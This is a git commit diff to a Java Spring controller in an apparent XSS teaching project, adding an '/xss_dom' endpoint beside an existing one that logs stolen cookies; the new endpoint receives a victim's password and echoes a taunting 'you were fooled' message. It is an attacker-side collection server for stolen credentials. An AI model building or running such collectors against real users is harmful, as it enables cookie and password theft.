1e6f851d4d1a512e3096c90c957f6e142fe7305f
vincenttuan <vincentjava@yahoo.com.tw>
2023-02-26 18:45:06 +0800

    security

--- Web-Hacker-7443/src/main/java/com/example/demo/controller/HackerController.java
+++ Web-Hacker-7443/src/main/java/com/example/demo/controller/HackerController.java
@@ -1,5 +1,7 @@
 package com.example.demo.controller;
 
+import java.io.IOException;
+
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 
@@ -14,5 +16,18 @@ public class HackerController {
 		response.addHeader("Access-Control-Allow-Origin", "*"); 
 		System.out.println("Hacker 偷取 cookie: " + request.getParameter("data"));
 		return "";
+	}
+	
+	@RequestMapping("/xss_dom")
+	public String xssDom(HttpServletRequest request, HttpServletResponse response) throws IOException {
+		response.setContentType("text/html;charset=UTF-8");
+		response.setCharacterEncoding("UTF-8");
+		response.addHeader("Access-Control-Allow-Origin", "*");
+		String password = request.getParameter("password");
+		if(password  == null ||  password.trim().length() == 0) {
+			return "<html><script>history.back();</script></html>";
+		}
+		String msg = "哈哈！你被騙了，你的密碼是：" + request.getParameter("password");
+		return msg;
 	}
 }
